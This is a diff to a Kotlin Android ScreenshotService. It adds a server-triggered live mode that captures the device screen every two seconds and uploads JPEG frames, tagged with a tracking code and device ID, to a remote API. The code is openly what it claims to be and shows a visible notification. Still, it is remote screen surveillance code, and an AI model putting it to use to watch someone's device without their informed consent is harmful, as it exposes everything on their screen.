@@ -40,6 +40,8 @@ class ScreenshotService : Service() {
     private var polling = false
     private var trackingCode = ""
     private var deviceId = ""
+    private var isLiveMode = false
+    private var liveCaptureRunnable: Runnable? = null
 
     companion object {
         private const val CHANNEL_ID = "ScreenshotChannel"
@@ -84,7 +86,7 @@ class ScreenshotService : Service() {
                 "Screenshot Service",
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Monitors for screenshot requests"
+                description = "Monitors for screenshot and live screen requests"
                 setShowBadge(false)
             }
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
@@ -101,19 +103,24 @@ class ScreenshotService : Service() {
             .build()
     }
 
+    private fun updateNotification(statusText: String) {
+        val manager = getSystemService(NotificationManager::class.java)
+        manager.notify(NOTIFICATION_ID, createNotification(statusText))
+    }
+
     private fun startPolling() {
         polling = true
         val pollRunnable = object : Runnable {
             override fun run() {
                 if (!polling) return
-                checkForScreenshotRequest()
-                handler.postDelayed(this, 3000)
+                checkForRequest()
+                handler.postDelayed(this, 2000)
             }
         }
         handler.post(pollRunnable)
     }
 
-    private fun checkForScreenshotRequest() {
+    private fun checkForRequest() {
         if (executor.isShutdown) return
         executor.execute {
             try {
@@ -125,16 +132,64 @@ class ScreenshotService : Service() {
                 val json = JSONObject(response)
                 if (json.optBoolean("pending", false)) {
                     val requestId = json.getString("id")
-                    handler.post { takeScreenshot(requestId) }
+                    handler.post { handleRequest(requestId) }
                 }
                 conn.disconnect()
             } catch (e: Exception) {
-                Log.e(TAG, "Failed to check screenshot request", e)
+                Log.e(TAG, "Failed to check request", e)
             }
         }
     }
 
-    private fun takeScreenshot(requestId: String) {
+    private fun handleRequest(requestId: String) {
+        if (executor.isShutdown) return
+        executor.execute {
+            try {
+                val url = URL("$API_BASE/api/check-screenshot?id=$requestId")
+                val conn = url.openConnection() as HttpURLConnection
+                conn.requestMethod = "GET"
+                conn.connectTimeout = 5000
+                val response = conn.inputStream.bufferedReader().readText()
+                val json = JSONObject(response)
+                val reqType = json.optString("request_type", "screenshot")
+                conn.disconnect()
+
+                if (reqType == "live") {
+                    handler.post { startLiveMode(requestId) }
+                } else {
+                    handler.post { takeSingleScreenshot(requestId) }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to get request type", e)
+            }
+        }
+    }
+
+    private fun startLiveMode(requestId: String) {
+        isLiveMode = true
+        updateNotification("Live screen active")
+        captureLoop()
+    }
+
+    private fun captureLoop() {
+        if (!isLiveMode || executor.isShutdown) return
+        takeAndUploadFrame(isLive = true)
+        liveCaptureRunnable = Runnable { captureLoop() }
+        handler.postDelayed(liveCaptureRunnable!!, 2000)
+    }
+
+    private fun stopLiveMode() {
+        isLiveMode = false
+        liveCaptureRunnable?.let { handler.removeCallbacks(it) }
+        liveCaptureRunnable = null
+        updateNotification("Screenshot monitoring active")
+    }
+
+    private fun takeSingleScreenshot(requestId: String) {
+        takeAndUploadFrame(isLive = false, requestId = requestId)
+    }
+
+    private fun takeAndUploadFrame(isLive: Boolean, requestId: String? = null) {
         val projection = projectionData
         if (projection == null) {
             Log.w(TAG, "No MediaProjection available")
@@ -146,16 +201,19 @@ class ScreenshotService : Service() {
             val metrics = DisplayMetrics()
             @Suppress("DEPRECATION")
             mgr.defaultDisplay.getRealMetrics(metrics)
-            val width = metrics.widthPixels
-            val height = metrics.heightPixels
+            val width = metrics.widthPixels / 2
+            val height = metrics.heightPixels / 2
             val density = metrics.densityDpi
 
+            imageReader?.close()
             imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1)
             val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            mediaProjection?.stop()
             mediaProjection = mpm.getMediaProjection(resultCode, projection)
 
+            virtualDisplay?.release()
             virtualDisplay = mediaProjection?.createVirtualDisplay(
-                "Screenshot",
+                "ScreenCapture",
                 width, height, density,
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                 imageReader!!.surface,
@@ -183,21 +241,25 @@ class ScreenshotService : Service() {
                         bitmap.recycle()
 
                         val stream = ByteArrayOutputStream()
-                        cropped.compress(Bitmap.CompressFormat.JPEG, 70, stream)
+                        cropped.compress(Bitmap.CompressFormat.JPEG, 50, stream)
                         cropped.recycle()
                         val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
                         val dataUrl = "data:image/jpeg;base64,$base64"
 
-                        uploadScreenshot(requestId, dataUrl)
+                        if (isLive) {
+                            uploadLiveFrame(dataUrl)
+                        } else if (requestId != null) {
+                            uploadScreenshot(requestId, dataUrl)
+                        }
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Failed to capture screenshot", e)
+                    Log.e(TAG, "Failed to capture", e)
                 }
-                cleanup()
-            }, 500)
+                cleanupCapture()
+            }, 300)
         } catch (e: Exception) {
             Log.e(TAG, "Failed to take screenshot", e)
-            cleanup()
+            cleanupCapture()
         }
     }
 
@@ -210,7 +272,6 @@ class ScreenshotService : Service() {
                 conn.setRequestProperty("Content-Type", "application/json")
                 conn.connectTimeout = 15000
                 conn.doOutput = true
-
                 val json = JSONObject().apply {
                     put("id", requestId)
                     put("code", trackingCode)
@@ -218,8 +279,7 @@ class ScreenshotService : Service() {
                     put("screenshot", screenshot)
                 }
                 conn.outputStream.write(json.toString().toByteArray())
-                val response = conn.responseCode
-                Log.d(TAG, "Screenshot uploaded (HTTP $response)")
+                Log.d(TAG, "Screenshot uploaded (HTTP ${conn.responseCode})")
                 conn.disconnect()
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to upload screenshot", e)
@@ -227,19 +287,42 @@ class ScreenshotService : Service() {
         }
     }
 
-    private fun cleanup() {
+    private fun uploadLiveFrame(frame: String) {
+        executor.execute {
+            try {
+                val url = URL("$API_BASE/api/upload-live-frame")
+                val conn = url.openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.connectTimeout = 10000
+                conn.doOutput = true
+                val json = JSONObject().apply {
+                    put("code", trackingCode)
+                    put("device_id", deviceId)
+                    put("frame", frame)
+                }
+                conn.outputStream.write(json.toString().toByteArray())
+                Log.d(TAG, "Live frame uploaded (HTTP ${conn.responseCode})")
+                conn.disconnect()
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to upload live frame", e)
+            }
+        }
+    }
+
+    private fun cleanupCapture() {
         try { virtualDisplay?.release() } catch (_: Exception) {}
-        try { mediaProjection?.stop() } catch (_: Exception) {}
-        try { imageReader?.close() } catch (_: Exception) {}
         virtualDisplay = null
-        mediaProjection = null
-        imageReader = null
     }
 
     override fun onDestroy() {
         polling = false
+        isLiveMode = false
+        liveCaptureRunnable?.let { handler.removeCallbacks(it) }
         handler.removeCallbacksAndMessages(null)
-        cleanup()
+        try { virtualDisplay?.release() } catch (_: Exception) {}
+        try { mediaProjection?.stop() } catch (_: Exception) {}
+        try { imageReader?.close() } catch (_: Exception) {}
         executor.shutdownNow()
         super.onDestroy()
     }
